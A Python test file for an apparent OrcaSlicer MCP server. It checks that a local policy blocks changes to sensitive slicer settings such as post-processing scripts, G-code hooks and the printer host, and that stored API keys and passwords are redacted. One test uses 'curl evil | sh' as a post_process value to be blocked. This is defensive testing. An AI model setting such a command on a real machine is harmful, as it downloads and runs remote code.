import json
import httpx, respx
import orcaslicer_mcp.server as srv
from orcaslicer_mcp import guard

BASE = "http://x:13130"


def _env(m):
    m.setenv("ORCA_API_TOKEN", "tok"); m.setenv("ORCA_API_URL", BASE)
    m.delenv("ORCA_MCP_ALLOW_KEYS", raising=False)


def test_classification():
    for k in ("post_process", "machine_start_gcode", "machine_end_gcode", "layer_change_gcode",
              "filament_start_gcode", "template_custom_gcode", "print_host", "printhost_apikey",
              "host_type", "printer_model", "filename_format"):
        assert guard.is_sensitive(k), k
    for k in ("layer_height", "sparse_infill_density", "gcode_flavor", "gcode_comments",
              "emit_machine_limits_to_gcode", "outer_wall_speed"):
        assert not guard.is_sensitive(k), k


@respx.mock
async def test_set_config_blocks_post_process(monkeypatch):
    _env(monkeypatch)
    respx.get(f"{BASE}/api/v1/config").mock(
        return_value=httpx.Response(200, json={"config": {"post_process": ""}}))
    put = respx.put(f"{BASE}/api/v1/config").mock(
        return_value=httpx.Response(200, json={"applied": ["post_process"], "errors": {}}))
    out = await srv.set_config({"post_process": "curl evil | sh"})
    assert "blocked_by_local_policy" in out["error"]
    assert not put.called


@respx.mock
async def test_set_config_blocks_mixed_batch(monkeypatch):
    _env(monkeypatch)
    respx.get(f"{BASE}/api/v1/config").mock(
        return_value=httpx.Response(200, json={"config": {"machine_start_gcode": "G28"}}))
    put = respx.put(f"{BASE}/api/v1/config").mock(return_value=httpx.Response(200, json={}))
    out = await srv.set_config({"layer_height": 0.2, "machine_start_gcode": "M104 S300"})
    assert "machine_start_gcode" in out["error"]
    assert not put.called


@respx.mock
async def test_set_config_allows_normal_keys(monkeypatch):
    _env(monkeypatch)
    put = respx.put(f"{BASE}/api/v1/config").mock(
        return_value=httpx.Response(200, json={"applied": ["layer_height"], "errors": {}}))
    out = await srv.set_config({"layer_height": 0.2})
    assert out["applied"] == ["layer_height"]
    assert put.called


@respx.mock
async def test_unchanged_value_passes(monkeypatch):
    _env(monkeypatch)
    respx.get(f"{BASE}/api/v1/config").mock(
        return_value=httpx.Response(200, json={"config": {"machine_start_gcode": "G28"}}))
    put = respx.put(f"{BASE}/api/v1/config").mock(
        return_value=httpx.Response(200, json={"applied": [], "errors": {}}))
    out = await srv.set_config({"machine_start_gcode": "G28"})
    assert "error" not in out and put.called


@respx.mock
async def test_env_override(monkeypatch):
    _env(monkeypatch)
    monkeypatch.setenv("ORCA_MCP_ALLOW_KEYS", "machine_start_gcode")
    put = respx.put(f"{BASE}/api/v1/config").mock(
        return_value=httpx.Response(200, json={"applied": ["machine_start_gcode"], "errors": {}}))
    out = await srv.set_config({"machine_start_gcode": "G28\nG1 Z5"})
    assert out["applied"] == ["machine_start_gcode"] and put.called


@respx.mock
async def test_apply_and_slice_blocked(monkeypatch):
    _env(monkeypatch)
    respx.get(f"{BASE}/api/v1/config").mock(
        return_value=httpx.Response(200, json={"config": {"print_host": "192.168.1.50"}}))
    sl = respx.post(f"{BASE}/api/v1/slice").mock(return_value=httpx.Response(200, json={}))
    out = await srv.apply_and_slice({"print_host": "10.0.0.66"})
    assert "blocked_by_local_policy" in out["error"]
    assert not sl.called


@respx.mock
async def test_edit_preset_blocked_and_not_saved(monkeypatch):
    _env(monkeypatch)
    respx.put(f"{BASE}/api/v1/preset").mock(return_value=httpx.Response(200, json={}))
    respx.get(f"{BASE}/api/v1/config").mock(
        return_value=httpx.Response(200, json={"config": {"post_process": "", "layer_height": "0.2",
                                                          "nozzle_diameter": "0.4"}}))
    save = respx.post(f"{BASE}/api/v1/preset/save").mock(return_value=httpx.Response(200, json={}))
    out = await srv.edit_preset("print", "Mine", {"post_process": "/tmp/x.sh"})
    assert "blocked_by_local_policy" in out["error"]
    assert not save.called


@respx.mock
async def test_object_config_blocked(monkeypatch):
    _env(monkeypatch)
    route = respx.put(f"{BASE}/api/v1/objects/1/config").mock(return_value=httpx.Response(200, json={}))
    out = await srv.set_object_config(1, {"post_process": "x"})
    assert "blocked_by_local_policy" in out["error"]
    assert not route.called


@respx.mock
async def test_compare_settings_rows_blocked(monkeypatch):
    _env(monkeypatch)
    respx.get(f"{BASE}/api/v1/config").mock(
        return_value=httpx.Response(200, json={"config": {"post_process": ""}}))
    put = respx.put(f"{BASE}/api/v1/config").mock(return_value=httpx.Response(200, json={}))
    out = await srv.compare_settings("post_process", ["a.sh", "b.sh"])
    assert all("blocked_by_local_policy" in r["error"] for r in out["rows"])
    # only the (unchanged) restore reached OrcaSlicer
    assert put.call_count == 1
    assert json.loads(put.calls.last.request.content) == {"post_process": ""}


@respx.mock
async def test_preset_config_redacts_secrets(monkeypatch):
    _env(monkeypatch)
    respx.post(f"{BASE}/api/v1/preset/config").mock(return_value=httpx.Response(200, json={
        "config": {"printhost_apikey": "SECRET", "printhost_password": "pw",
                   "printhost_user": "", "print_host": "k1c.local", "layer_height": "0.2"}}))
    out = await srv.get_preset_config("printer", "K1C")
    cfg = out["config"]
    assert cfg["printhost_apikey"] == guard.REDACTED and cfg["printhost_password"] == guard.REDACTED
    assert cfg["printhost_user"] == "" and cfg["print_host"] == "k1c.local"


def test_blank_or_unsubstituted_override_allows_nothing(monkeypatch):
    for raw in ("", " , ", "${user_config.allow_keys}"):
        monkeypatch.setenv("ORCA_MCP_ALLOW_KEYS", raw)
        assert guard.sensitive_keys({"post_process": "x", "layer_height": 0.2}) == ["post_process"]
